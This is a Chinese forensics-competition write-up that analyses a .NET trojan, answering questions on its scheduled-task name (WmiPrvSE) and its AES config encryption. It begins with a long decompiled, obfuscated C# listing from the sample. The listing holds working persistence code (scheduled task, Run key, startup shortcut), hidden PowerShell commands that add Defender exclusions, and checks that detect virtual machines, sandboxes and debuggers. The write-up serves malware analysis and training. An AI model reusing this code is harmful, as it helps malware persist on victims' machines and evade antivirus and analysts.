				if (Conversions.ToBoolean(MUaDlUN9X5rN98KUAn5WbH3KOZ85RyCCg3qIDoLO8mHqWoqZYUPKBUWIW2vuwan1zJDsD93oLEVavFhmWRM9urmZakxV.9wp6DW38pEGrxGQEOQkzV4F6DVSJViAZDNdsO9gtbzZBQrydyvd059AgNPuLYcnNJjNwBFhzo8yNTC1aOPH4fLXTZlHK()))
				{
					processStartInfo.Arguments = string.Concat(new string[]
					{
						&quot;/create /f /RL HIGHEST /sc minute /mo 1 /tn \&quot;&quot;,
						Path.GetFileNameWithoutExtension(NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.EB5J4sIzfH74BwfgRjacCtnEuNWFxu93z57nr4HrttTW5asXOhadv7pC7YFu),
						&quot;\&quot; /tr \&quot;&quot;,
						text,
						&quot;\&quot;&quot;
					});
				}
				else
				{
					processStartInfo.Arguments = string.Concat(new string[]
					{
						&quot;/create /f /sc minute /mo 1 /tn \&quot;&quot;,
						Path.GetFileNameWithoutExtension(NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.EB5J4sIzfH74BwfgRjacCtnEuNWFxu93z57nr4HrttTW5asXOhadv7pC7YFu),
						&quot;\&quot; /tr \&quot;&quot;,
						text,
						&quot;\&quot;&quot;
					});
				}
				Process process = Process.Start(processStartInfo);
				process.WaitForExit();
			}
			catch (Exception ex4)
			{
			}
			try
			{
				MuC0Ek32S2qWYkJGK8MCDraE3NRaegV2ciWj85lpbnaytobXnqusBz1a9jJ9.Computer.Registry.CurrentUser.OpenSubKey(&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, true).SetValue(Path.GetFileNameWithoutExtension(NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.EB5J4sIzfH74BwfgRjacCtnEuNWFxu93z57nr4HrttTW5asXOhadv7pC7YFu), text);
			}
			catch (Exception ex5)
			{
			}
			try
			{
				string text2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + &quot;\\&quot; + Path.GetFileNameWithoutExtension(NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.EB5J4sIzfH74BwfgRjacCtnEuNWFxu93z57nr4HrttTW5asXOhadv7pC7YFu) + &quot;.lnk&quot;;
				object instance = Interaction.CreateObject(&quot;WScript.Shell&quot;, &quot;&quot;);
				Type type = null;
				string memberName = &quot;CreateShortcut&quot;;
				object[] array = new object[]
				{
					text2
				};
				object[] arguments = array;
				string[] argumentNames = null;
				Type[] typeArguments = null;
				bool[] array2 = new bool[]
				{
					true
				};
				object obj = NewLateBinding.LateGet(instance, type, memberName, arguments, argumentNames, typeArguments, array2);
				if (array2[0])
				{
					text2 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
				}
				object instance2 = obj;
				NewLateBinding.LateSetComplex(instance2, null, &quot;TargetPath&quot;, new object[]
				{
					text
				}, null, null, false, true);
				NewLateBinding.LateSetComplex(instance2, null, &quot;WorkingDirectory&quot;, new object[]
				{
					&quot;&quot;
				}, null, null, false, true);
				NewLateBinding.LateCall(instance2, null, &quot;Save&quot;, new object[0], null, null, null, true);
				ACX0qTJzEzq40qP5qFxb.BQq61GBk6rjrH8oz1GbD = new FileStream(text2, FileMode.Open);
			}
			catch (Exception ex6)
			{
			}
			VRti6vhPYugo9GdL3aQYj2eDRdhSfKIazXyfNr18qkYGBHO0iTkiZoRtMwtI7vEZAaW8tYfk5m7J2.oXAUverEkn3LAFv6enuVZPjP25NAIAb6gydo8yzlQ3nHid4F58NM7IcXiFXorwNtYk82lvGcvQeSQ();
			ACX0qTJzEzq40qP5qFxb.t93znx36c8iu2Asm9DOL();
			new Thread(new ThreadStart(oQm0xzosrWM7CGTCsMZCODumwvt5ODG1drdBoIeM03A6xt9SK5NFYiMYXb1U.QHt7a40ajKLMcV6MPMBFs7AqBMWMzEVp5ZapjKf2wHZY5q13UGzla615Vp7ngNI0gOBHgNACfKiPSedl1Rme7AYQUpzp)).Start();
			new Thread(new ThreadStart(oQm0xzosrWM7CGTCsMZCODumwvt5ODG1drdBoIeM03A6xt9SK5NFYiMYXb1U.SJmNHFksp15qMA7Hqi2yYvrhvwyiHdWYMcy49IYU67XCIdkWfQuonBucAUH0E8fjyTrdQGmo70zwP7mT5S4i4A2Nq7R6)).Start();
			if (Conversions.ToBoolean(MUaDlUN9X5rN98KUAn5WbH3KOZ85RyCCg3qIDoLO8mHqWoqZYUPKBUWIW2vuwan1zJDsD93oLEVavFhmWRM9urmZakxV.9wp6DW38pEGrxGQEOQkzV4F6DVSJViAZDNdsO9gtbzZBQrydyvd059AgNPuLYcnNJjNwBFhzo8yNTC1aOPH4fLXTZlHK()))
			{
				ke48iewt5U3eoIMbjLCt.IhdVe0tvCXGD9oiOcVCe();
			}
			Thread thread = new Thread(new ThreadStart(oQm0xzosrWM7CGTCsMZCODumwvt5ODG1drdBoIeM03A6xt9SK5NFYiMYXb1U.dVT7QlQgF2NqhfOnN0OAFFdOnYiNcZcuysO3xAWn94yOtJq1SXQhe4XgG86r16N8q5lazCHgGUnMtInbQUHOF9B0XoaI));
			Thread thread2 = new Thread(new ThreadStart(oQm0xzosrWM7CGTCsMZCODumwvt5ODG1drdBoIeM03A6xt9SK5NFYiMYXb1U.LxVBJKbEOfbVb11Lnv3FZBZhjRKX2VBTyTcaiaU7D0k0WjJYcLFSr4Q8HE5wddEPXj7jW1tcPz336tcso3lDf2mobfE5));
			thread.Start();
			thread2.Start();
			thread2.Join();
		}

		// Token: 0x06000027 RID: 39 RVA: 0x00002EDC File Offset: 0x000010DC
		public static void j4d5GNXICPEVRtyjnlgCMXk7jToiY6J1mAs5nLQFxfcp708CM7Hr1XTxfCBg()
		{
			if (Conversions.ToBoolean(MUaDlUN9X5rN98KUAn5WbH3KOZ85RyCCg3qIDoLO8mHqWoqZYUPKBUWIW2vuwan1zJDsD93oLEVavFhmWRM9urmZakxV.9wp6DW38pEGrxGQEOQkzV4F6DVSJViAZDNdsO9gtbzZBQrydyvd059AgNPuLYcnNJjNwBFhzo8yNTC1aOPH4fLXTZlHK()))
			{
				try
				{
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					processStartInfo.FileName = &quot;powershell.exe&quot;;
					processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					processStartInfo.Arguments = &quot;-ExecutionPolicy Bypass Add-MpPreference -ExclusionPath '&quot; + ACX0qTJzEzq40qP5qFxb.8qqIc9C1rZ7T3TBLTgSV + &quot;'&quot;;
					Process.Start(processStartInfo).WaitForExit();
					processStartInfo.Arguments = &quot;-ExecutionPolicy Bypass Add-MpPreference -ExclusionProcess '&quot; + Process.GetCurrentProcess().MainModule.ModuleName + &quot;'&quot;;
					Process.Start(processStartInfo).WaitForExit();
					processStartInfo.Arguments = string.Concat(new string[]
					{
						&quot;-ExecutionPolicy Bypass Add-MpPreference -ExclusionPath '&quot;,
						NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.pAiK6SOy8HEO6uDLFXMlZSPdAbNKgcHqwR32QBERmGnbcKxg5SelHoKfUgGc,
						&quot;\\&quot;,
						NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.EB5J4sIzfH74BwfgRjacCtnEuNWFxu93z57nr4HrttTW5asXOhadv7pC7YFu,
						&quot;'&quot;
					});
					Process.Start(processStartInfo).WaitForExit();
					processStartInfo.Arguments = &quot;-ExecutionPolicy Bypass Add-MpPreference -ExclusionProcess '&quot; + Path.GetFileName(NB2mi1VBTSN5U40DfEsDcrzgxWCrxt7i1yCoMW0Zb5dK9QwIjZ6W6wYeHriq.EB5J4sIzfH74BwfgRjacCtnEuNWFxu93z57nr4HrttTW5asXOhadv7pC7YFu) + &quot;'&quot;;
					Process.Start(processStartInfo).WaitForExit();
				}
				catch (Exception ex)
				{
				}
			}
		}

		// Token: 0x06000028 RID: 40 RVA: 0x00002110 File Offset: 0x00000310
		public static void AuPSZXXVSMF0DQRCvC2rt5MfcrYC48o7KO1SI69og2JLhf02Th6Xma2HOysY()
		{
			if (!oQm0xzosrWM7CGTCsMZCODumwvt5ODG1drdBoIeM03A6xt9SK5NFYiMYXb1U.Mi6spCUvppp4DtgyuvMzJhDBJsveVBG9zeD8c1kQXdScZVgnMViFJzIwncYfWRaCuUs0darWmS0uW4ndY5RkKqmDAG78() &amp;&amp; !oQm0xzosrWM7CGTCsMZCODumwvt5ODG1drdBoIeM03A6xt9SK5NFYiMYXb1U.ekfERkJzvPUVc9xQ7RadvF87hIVFUbAaixRJaKzHcRjz6UQErCZPPcp2QVwluQOmYuWHUC5yKellGaX2R5rdbv4oYJoe())
			{
				if (!oQm0xzosrWM7CGTCsMZCODumwvt5ODG1drdBoIeM03A6xt9SK5NFYiMYXb1U.2roByDJH6ZwpyyMdfAo4PFI3PqRqzn0PSxC5Zg4kzrh6PUEFGOozNDZH3SKF4M1wI6K9GZ1nL6cPaKJJYpNJSKRzaheb())
				{
					if (!oQm0xzosrWM7CGTCsMZCODumwvt5ODG1drdBoIeM03A6xt9SK5NFYiMYXb1U.nIHJ1ssdguWOmBZEjwm4ZTWC6RpznK4TffpH05TZr9zRIsVfLweHMOElWw68())
					{
						if (!oQm0xzosrWM7CGTCsMZCODumwvt5ODG1drdBoIeM03A6xt9SK5NFYiMYXb1U.pP3jQ2G5fRQOBkR4RuG4ivhEGAqezIt7vqpAJDH5RetSUjBUu1dokMPle3i3())
						{
							return;
						}
					}
				}
			}
			Environment.FailFast(null);
		}

		// Token: 0x06000029 RID: 41 RVA: 0x00002FF4 File Offset: 0x000011F4
		private static bool pP3jQ2G5fRQOBkR4RuG4ivhEGAqezIt7vqpAJDH5RetSUjBUu1dokMPle3i3()
		{
			try
			{
				string text = new WebClient().DownloadString(&quot;http://ip-api.com/line/?fields=hosting&quot;);
				return text.Contains(&quot;true&quot;);
			}
			catch (Exception ex)
			{
			}
			return false;
		}

		// Token: 0x0600002A RID: 42 RVA: 0x00003044 File Offset: 0x00001244
		private static bool nIHJ1ssdguWOmBZEjwm4ZTWC6RpznK4TffpH05TZr9zRIsVfLweHMOElWw68()
		{
			try
			{
				if (new ComputerInfo().OSFullName.ToLower().Contains(&quot;xp&quot;))
				{
					return true;
				}
			}
			catch (Exception ex)
			{
			}
			return false;
		}

		// Token: 0x0600002B RID: 43 RVA: 0x00003094 File Offset: 0x00001294
		private static bool Mi6spCUvppp4DtgyuvMzJhDBJsveVBG9zeD8c1kQXdScZVgnMViFJzIwncYfWRaCuUs0darWmS0uW4ndY5RkKqmDAG78()
		{
			try
			{
				using (object obj = new ManagementObjectSearcher(&quot;Select * from Win32_ComputerSystem&quot;))
				{
					using (object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(obj, null, &quot;Get&quot;, new object[0], null, null, null)))
					{
						try
						{
							foreach (object obj2 in ((IEnumerable)objectValue))
							{
								object objectValue2 = RuntimeHelpers.GetObjectValue(obj2);
								string text = NewLateBinding.LateIndexGet(objectValue2, new object[]
								{
									&quot;Manufacturer&quot;
								}, null).ToString().ToLower();
								if (Operators.CompareString(text, &quot;microsoft corporation&quot;, false) != 0 || !NewLateBinding.LateIndexGet(objectValue2, new object[]
								{
									&quot;Model&quot;
								}, null).ToString().ToUpperInvariant().Contains(&quot;VIRTUAL&quot;))
								{
									if (!text.Contains(&quot;qemu&quot;))
									{
										if (Operators.CompareString(NewLateBinding.LateIndexGet(objectValue2, new object[]
										{
											&quot;Model&quot;
										}, null).ToString(), &quot;VirtualBox&quot;, false) != 0)
										{
											continue;
										}
									}
								}
								return true;
							}
						}
						finally
						{
							IEnumerator enumerator;
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
					}
				}
			}
			catch (Exception ex)
			{
			}
			return false;
		}

		// Token: 0x0600002C RID: 44 RVA: 0x0000324C File Offset: 0x0000144C
		private static bool ekfERkJzvPUVc9xQ7RadvF87hIVFUbAaixRJaKzHcRjz6UQErCZPPcp2QVwluQOmYuWHUC5yKellGaX2R5rdbv4oYJoe()
		{
			bool flag = false;
			bool result;
			try
			{
				oQm0xzosrWM7CGTCsMZCODumwvt5ODG1drdBoIeM03A6xt9SK5NFYiMYXb1U.nSNc1Q0GG8aN3MF1OArz2z7uogUXuYYLEvsMxpltLD6VmXZAgjSZVHvphukvLiWMK6TYHIsAz6ugJVJ7BhVRm1QEz7lx(Process.GetCurrentProcess().Handle, ref flag);
				result = flag;
			}
			catch (Exception ex)
			{
				result = flag;
			}
			return result;
		}

		// Token: 0x0600002D RID: 45 RVA: 0x0000329C File Offset: 0x0000149C
		private static bool 2roByDJH6ZwpyyMdfAo4PFI3PqRqzn0PSxC5Zg4kzrh6PUEFGOozNDZH3SKF4M1wI6K9GZ1nL6cPaKJJYpNJSKRzaheb()
		{
			bool result;
			try
			{
				if (oQm0xzosrWM7CGTCsMZCODumwvt5ODG1drdBoIeM03A6xt9SK5NFYiMYXb1U.rgXTs7mD5xW0pNhvBEkl5gT1M7CxjhLt6BgegsGiceVXuORoR8HLqgV1rzHGXir1sd7268MbWZoyrYKQyiCFBZDlhGy0(&quot;SbieDll.dll&quot;).ToInt32() != 0)
				{
					result = true;
				}
				else
				{
					result = false;
				}
			}
			catch (Exception ex)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x0600002E RID: 46
		[DllImport(&quot;kernel32.dll&quot;, EntryPoint = &quot;GetModuleHandle&quot;)]
		public static extern IntPtr rgXTs7mD5xW0pNhvBEkl5gT1M7CxjhLt6BgegsGiceVXuORoR8HLqgV1rzHGXir1sd7268MbWZoyrYKQyiCFBZDlhGy0(string JhF1EyEkLtc7VnxMoMysC2mx7wrEfcTfTyk3UEKC3gvM2yk2Snjrlx7d1W3yLTfEE4rt3NoAiA0ivALoyv1ibp9NMoeH);

		// Token: 0x0600002F RID: 47
		[DllImport(&quot;kernel32.dll&quot;, EntryPoint = &quot;CheckRemoteDebuggerPresent&quot;, ExactSpelling = true, SetLastError = true)]
		public static extern bool nSNc1Q0GG8aN3MF1OArz2z7uogUXuYYLEvsMxpltLD6VmXZAgjSZVHvphukvLiWMK6TYHIsAz6ugJVJ7BhVRm1QEz7lx(IntPtr ebS3aODz6u4WMXVX8EFGZQk7xggU4uadhtfNHj6Dtt5BiWoHyIgEK6ThHDbNkne2Av4XRAJcH8u5fQbwjswYjYkZpr3A, ref bool 3KGzlHM6rls42OaqjINhwmYFwb2SHUdISbxPrbLCe5xmUxybRJuocsXvTXAOxl5abiOH0NVP0G7nakfag9uPbk77xB5t);

		// Token: 0x06000030 RID: 48 RVA: 0x00002141 File Offset: 0x00000341
		[CompilerGenerated]
		private static void QHt7a40ajKLMcV6MPMBFs7AqBMWMzEVp5ZapjKf2wHZY5q13UGzla615Vp7ngNI0gOBHgNACfKiPSedl1Rme7AYQUpzp()
		{
			kJx6L3azGytvvlpO5g4M7vFzwGBCSetM1yxXtBPEZEjmmDw8uu6Q82pIaJr4lKWmVXwocSYY9KQQd.JKx38cy8TbFy5P5ttrQ9OLrthXtu96odVBXsmvxSn20Mt8RNga1E4WcryC9xOrWhaWouoY8gKqapQ();
		}

		// Token: 0x06000031 RID: 49 RVA: 0x0000214A File Offset: 0x0000034A
		[CompilerGenerated]
		private static void SJmNHFksp15qMA7Hqi2yYvrhvwyiHdWYMcy49IYU67XCIdkWfQuonBucAUH0E8fjyTrdQGmo70zwP7mT5S4i4A2Nq7R6()
		{
			7Io8roq4MU8fmCC0ncd1.gh6zWBQLPvwLyT8dG3JY();
		}

		// Token: 0x06000032 RID: 50 RVA: 0x00002153 File Offset: 0x00000353
		[CompilerGenerated]
		[DebuggerStepThrough]
		private static void dVT7QlQgF2NqhfOnN0OAFFdOnYiNcZcuysO3xAWn94yOtJq1SXQhe4XgG86r16N8q5lazCHgGUnMtInbQUHOF9B0XoaI()
		{
			ACX0qTJzEzq40qP5qFxb.COPd5Jf3NPKSOltCTNzb();
		}

		// Token: 0x06000033 RID: 51 RVA: 0x0000215D File Offset: 0x0000035D
		[CompilerGenerated]
		private static void LxVBJKbEOfbVb11Lnv3FZBZhjRKX2VBTyTcaiaU7D0k0WjJYcLFSr4Q8HE5wddEPXj7jW1tcPz336tcso3lDf2mobfE5()
		{
			for (;;)
			{
				Thread.Sleep(new Random().Next(3000, 10000));
				if (!MUaDlUN9X5rN98KUAn5WbH3KOZ85RyCCg3qIDoLO8mHqWoqZYUPKBUWIW2vuwan1zJDsD93oLEVavFhmWRM9urmZakxV.gmC4seKwT67zDBQdgKSaPDpaypoVwopRxAoFLfZGJO7zUgVVgoXbysebonYlwg1LHiwbKvMwcolDlQ6Da88Q5HFju8iU)
				{
					MUaDlUN9X5rN98KUAn5WbH3KOZ85RyCCg3qIDoLO8mHqWoqZYUPKBUWIW2vuwan1zJDsD93oLEVavFhmWRM9urmZakxV.ljAw5hbJykmgybMzc1lJo66vUdgc0gYpSHM4mVuOe2hF1VPKIxlBXYHILVZUOXPspYKQywrDMkDj8lNJugg7xNwYLm9y();
					MUaDlUN9X5rN98KUAn5WbH3KOZ85RyCCg3qIDoLO8mHqWoqZYUPKBUWIW2vuwan1zJDsD93oLEVavFhmWRM9urmZakxV.u9706OVQm3F7ADJJyDV85Ea7OQFIveDAEfezQ8YXy7JEm0WUrIUs6v97sMf4cGt3Y8K9zXPDvKXTgvtlmqql8QcZG9oQ();
				}
				MUaDlUN9X5rN98KUAn5WbH3KOZ85RyCCg3qIDoLO8mHqWoqZYUPKBUWIW2vuwan1zJDsD93oLEVavFhmWRM9urmZakxV.BSpxxXQVTPqyMEuYGxIAbM4AHkcCZtQzs9U0mT0OrsBaRzpcDbKeZOYVaQ8vRDKgYl1M92DEOWny7InbQPsDIFDAd979.WaitOne();
			}
		}

		// Token: 0x06000034 RID: 52 RVA: 0x00002199 File Offset: 0x00000399
		public static string fZkCaA8tBGeb1kFghkzm()
		{
			return &quot;N3D8vmFpzreAMuEup3Va&quot;;
		}

		// Token: 0x06000035 RID: 53 RVA: 0x0000205F File Offset: 0x0000025F
		public static int jheFB3cRNal8qSfZctYY()
		{
			return 33836983;
		}

		// Token: 0x06000036 RID: 54 RVA: 0x000021A0 File Offset: 0x000003A0
		public static string RVjf1Fr9C0RFRrp2uS7j()
		{
			return &quot;aq7Kz1lL0zpiqHdwHADp&quot;;
		}

		// Token: 0x06000037 RID: 55 RVA: 0x000021A7 File Offset: 0x000003A7
		public static int Sh8UxNVZc31PrAfnMrrb()
		{
			return 42807109;
		}

		// Token: 0x06000038 RID: 56 RVA: 0x000021AE File Offset: 0x000003AE
		public static string WS8VcwvafDSR8VN0kRWx()
		{
			return &quot;CuywTB3p0iC6DEejNOIc&quot;;
		}

		// Token: 0x06000039 RID: 57 RVA: 0x000021B5 File Offset: 0x000003B5
		public static int PW9gQ4DDRzQ3LaUkJOvI()
		{
			return 30743165;
		}

		// Token: 0x0600003A RID: 58 RVA: 0x000021BC File Offset: 0x000003BC
		public static string Rnfqk6chY8UYmJRPbWfS()
		{
			return &quot;DMDmmAoBAQXMBTRjAWcZ&quot;;
		}

		// Token: 0x0600003B RID: 59 RVA: 0x000021C3 File Offset: 0x000003C3
		public static int MH3AMtPMlx5OBaExE5me()
		{
			return 5267792;
		}

		// Token: 0x0600003C RID: 60 RVA: 0x000021CA File Offset: 0x000003CA
		public static string yM7Suv3FFGdVORAOxDmo()
		{
			return &quot;DtpzJFcAZfRkJ2omiXlE&quot;;
		}

		// Token: 0x0600003D RID: 61 RVA: 0x000021D1 File Offset: 0x000003D1
		public static int yfuWrFih5IrLeo8CAAH5()
		{
			return 24866858;
		}

		// Token: 0x0600003E RID: 62 RVA: 0x000021D8 File Offset: 0x000003D8
		public static string DUDElGoGZQDGyX29C9Fw()
		{
			return &quot;T6wWnyhMzCfwSnackpmq&quot;;
		}

		// Token: 0x0600003F RID: 63 RVA: 0x000021DF File Offset: 0x000003DF
		public static int i17mH4HuNLFOediqOkPg()
		{
			return 81594451;
		}

		// Token: 0x06000040 RID: 64 RVA: 0x000021E6 File Offset: 0x000003E6
		public static string R4YeYpwOfJ4RaEY09EXA()
		{
			return &quot;DAIldigaLEtMjHdpakXQ&quot;;
		}

		// Token: 0x06000041 RID: 65 RVA: 0x000020BB File Offset: 0x000002BB
		public static int wXyMvSXWplLeikGoZOEH()
		{
			return 86079514;
		}

		// Token: 0x06000042 RID: 66 RVA: 0x000021ED File Offset: 0x000003ED
		public static string sHA40JarG8Y5qla12NcM()
		{
			return &quot;QBqOKC8eNW41IWjAb3ZT&quot;;
		}

		// Token: 0x06000043 RID: 67 RVA: 0x000021F4 File Offset: 0x000003F4
		public static int hD1JbiShD25cXjSR90UT()
		{
			return 77109389;
		}

		// Token: 0x06000044 RID: 68 RVA: 0x000021FB File Offset: 0x000003FB
		public static string 3EOSJCRSxgnuhPC9aXp1()
		{
			return &quot;nJ2SWZiRr0gbEwyXlcPJ&quot;;
		}

		// Token: 0x06000045 RID: 69 RVA: 0x000020D7 File Offset: 0x000002D7
		public static int er5E4YY6NPWkOd1N5M3W()
		{
			return 72624326;
		}

		// Token: 0x06000046 RID: 70 RVA: 0x00002202 File Offset: 0x00000402
		public static string InOAsy0zBtPL2EVaBgPN()
		{
			return &quot;fzYgtjuvOAd1KBKHRRDC&quot;;
		}

		// Token: 0x06000047 RID: 71 RVA: 0x000021DF File Offset: 0x000003DF
		public static int 33YKd7VBtpMHZqHDix7d()
		{
			return 81594451;
		}

		// Token: 0x06000048 RID: 72 RVA: 0x00002209 File Offset: 0x00000409
		public static string xphwqAAnHOZyJE6yGBUk()
		{
			return &quot;qH88wzlqOqSBb3dggljQ&quot;;
		}

		// Token: 0x06000049 RID: 73 RVA: 0x00002210 File Offset: 0x00000410
		public static int afyrrk4LnZEPA8F4pCCP()
		{
			return 27693106;
		}

		// Token: 0x0600004A RID: 74 RVA: 0x00002217 File Offset: 0x00000417
		public static string wptA5gdCtSnN0LQ9b6Mu()
		{
			return &quot;TkiwJVKzt9YvqgD3IaJD&quot;;
		}

		// Token: 0x0600004B RID: 75 RVA: 0x0000221E File Offset: 0x0000041E
		public static int MPiF3Vd1Pz1i31hqr93X()
		{
			return 39489479;
		}

		// Token: 0x0600004C RID: 76 RVA: 0x00002225 File Offset: 0x00000425
		public static string uKDbb3kSf3ZC3HYNzOtM()
		{
			return &quot;iShgK3bODkkuvY0O4frh&quot;;
		}

		// Token: 0x0600004D RID: 77 RVA: 0x0000222C File Offset: 0x0000042C
		public static int 1xVsYampGBqLqiHidIWr()
		{
			return 83172674;
		}

		// Token: 0x0600004E RID: 78 RVA: 0x00002233 File Offset: 0x00000433
		public static string nX6cHJFmgkys6Zz7eYKH()
		{
			return &quot;52YJMsKDoaZ5tJVkUEdD&quot;;
		}

		// Token: 0x0600004F RID: 79 RVA: 0x0000223A File Offset: 0x0000043A
		public static int htEcHrPeiqwjh39ZrGRZ()
		{
			return 38322046;
		}

		// Token: 0x06000050 RID: 80 RVA: 0x00002241 File Offset: 0x00000441
		public static string F2V2feazx32hUEdpSgGk()
		{
			return &quot;y4wrgC8teV7hTOoHjzLG&quot;;
		}

		// Token: 0x06000051 RID: 81 RVA: 0x00002248 File Offset: 0x00000448
		public static int D6A7qh6586W8C6pIhuDt()
		{
			return 45963554;
		}
	}
}

第一块能看到一堆tostring

那么这里应该是解码字符串用的


<img src="/Picture/WpDF/Pinghang/2026Group/155.png" width="1061" title="" crop="0,0,1,1" id="uf2aeb797" class="ne-image">

然后紧接着是进入了一个判断


<img src="/Picture/WpDF/Pinghang/2026Group/156.png" width="563" title="" crop="0,0,1,1" id="u101fba1e" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/157.png" width="1021.5" title="" crop="0,0,1,1" id="u701fba52" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/158.png" width="1150" title="" crop="0,0,1,1" id="u43810c4d" class="ne-image">

这玩意调用了Mutex的三参数构造函数

Mutex是.NET里面的互斥锁（或者应该被称作同名互斥体），保证多个线程中只能有一个使用带有锁对象的对象（详情请见C1/C1/Concurrent/线程对象/同步/锁对象 ，这玩意跟java的锁对象差不多）

这里是用来检测能否创建的，如果不能创建即返回false后立刻退出

这玩意可能是个反沙箱，也可能只是防止多开（因为如果有同名锁的话，这里就无法成功创建），具体需要确认名字（因为某些沙箱会预设某些锁的名字，如果在这里创建了一个沙箱里面预设的锁的名字，那么即可断定这是在沙箱中而销毁自身）

但是


<img src="/Picture/WpDF/Pinghang/2026Group/159.png" width="1053" title="" crop="0,0,1,1" id="ua5ac721f" class="ne-image">

这里面的名字是个硬编码的名称，因此无法确定是否是反沙箱，很可能只是防多开

继续看下面

下面紧接着调用了一个函数

去看函数里面的东西


<img src="/Picture/WpDF/Pinghang/2026Group/160.png" width="986.5" title="" crop="0,0,1,1" id="ud24d4f9c" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/161.png" width="1073.5" title="" crop="0,0,1,1" id="u54389d95" class="ne-image">

连续挂了5个if，这5个if对应的函数就在下面


<img src="/Picture/WpDF/Pinghang/2026Group/162.png" width="1089.5" title="" crop="0,0,1,1" id="u6711a7eb" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/163.png" width="1062.5" title="" crop="0,0,1,1" id="u559d3dc6" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/164.png" width="1095" title="" crop="0,0,1,1" id="uc9c52c56" class="ne-image">

（PS，以下是否真实并不确定，但大致应该没问题）

第一个函数是检查ip地址的

这里会返回一行文本，如果true表示是托管商的IP，而沙箱常常使用这种IP

第二个函数检测操作系统是否带xp（这里指windows XP）

沙箱为了性能原因常常使用xp

第三个是检测是否是常见虚拟机

查询 Win32_ComputerSystem，检查 Manufacturer 和 Model 字段，

如果Manufacturer = "Microsoft Corporation" 且 Model 包含 "VIRTUAL"，推测是Hyper-v虚拟机

如果Manufacturer 包含 "qemu"，推测是QEMU或者是KVM

如果Model = "VirtualBox"，推测是VirtualBox

这三个都是常见虚拟机

第四个检测是否被调试

通过调用GetCurrentProgress().Handle()返回当前进程句柄，在ref flag中会返回是否正在被调试

第五个检测沙盘用的

GetModuleHandle("SbieDll.dll")是检测SbieDll.dll是否在进程中，Sandboxie会在运行时将dll注入进程中

### 56 接上题，木马为获得提升的权限执行而创建的计划任务名称是什么?【答案格式： Netlogon】
#### 答案
WmiPrvSE

#### 过程
不妨继续看下去入口


<img src="/Picture/WpDF/Pinghang/2026Group/165.png" width="1025" title="" crop="0,0,1,1" id="u89024777" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/166.png" width="1086" title="" crop="0,0,1,1" id="u1f3a12a6" class="ne-image">

这个函数里面能看到powershell，但并非用来提升权限的，而是用来添加排除项的

这其中的Add-MpPreference，意思是添加一个病毒检测的排除项，加入排除项的路径不再会被windows安全中心检测

继续看下面


<img src="/Picture/WpDF/Pinghang/2026Group/167.png" width="731.5" title="" crop="0,0,1,1" id="u3b0516f2" class="ne-image">

一看就是创建文件

在验证过不在调试和沙箱中后，创建文件写入东西（应该是执行的负载）

继续往下看


<img src="/Picture/WpDF/Pinghang/2026Group/168.png" width="1032.5" title="" crop="0,0,1,1" id="u6b46c985" class="ne-image">

<img src="/Picture/WpDF/Pinghang/2026Group/169.png" width="1048.5" title="" crop="0,0,1,1" id="ub0d92f03" class="ne-image">

这里可以看到定义了两个命令行参数

在if的判断中可以看到，GetCurrent()获取用户当前身份，IsInRole判断是否是管理员，是返回true

因此外面俩命令行参数意义就很明确了

/create 用来创建

/f 强制覆盖

/RL HIGEST 获取最高权限，if判断成功了有这个，false了就没有这个，目的是获取用户当前可用的最高权限

/sc minute /mo 1 每一分钟执行一次

/tn ... 任务名

/tr ... 程序路径

这里问路径名，那去查那个字符串是什么即可


<img src="/Picture/WpDF/Pinghang/2026Group/170.png" width="867.5" title="" crop="0,0,1,1" id="u3dd25e65" class="ne-image">

这玩意尝试用base64解码只会出现一堆乱码


<img src="/Picture/WpDF/Pinghang/2026Group/171.png" width="1169" title="" crop="0,0,1,1" id="ud576d65d" class="ne-image">

因此加密方式并非base64

具体加密方式见下一题





总之，解出来是这玩意


<img src="/Picture/WpDF/Pinghang/2026Group/172.png" width="1181" title="" crop="0,0,1,1" id="uae349b3d" class="ne-image">

按照格式，格式中没有后缀，那也去掉后缀

WmiPrvSE

### 57 木马使用哪种加密算法来加密或混淆其配置数据？（答案格式：BASE64）
#### 答案
AES

#### 过程
既然问加密算法是什么，那程序中肯定有解密的算法

寻找这个字段在程序中还有哪里出现过


<img src="/Picture/WpDF/Pinghang/2026Group/173.png" width="1142.5" title="" crop="0,0,1,1" id="u3bb905a6" class="ne-image">

豪，我们在入口程序的开头也发现了它，而且是将自身调用完函数后再次赋值给自身

那么即可怀疑这个调用的函数是用来解密的

进去看看


<img src="/Picture/WpDF/Pinghang/2026Group/174.png" width="1040.5" title="" crop="0,0,1,1" id="u69d78b2c" class="ne-image">

AES秒了（（

RijndaelManaged这个类就是AES在.NET中对应的类



不妨看看怎么解密

首先是找Key是多少

可以看到rijndaelManaged.Key = array

而array来源于sourcearray的复制，这玩意来自一个字段的哈希值

这也是下面一题的答案
<img src="/Picture/WpDF/Pinghang/2026Group/175.png" width="935" title="" crop="0,0,1,1" id="uc85897b1" class="ne-image">

豪，那么我们现在能知道key的运算方式：

先计算8xTJ0EKPuiQsJVaT的MD5哈希值

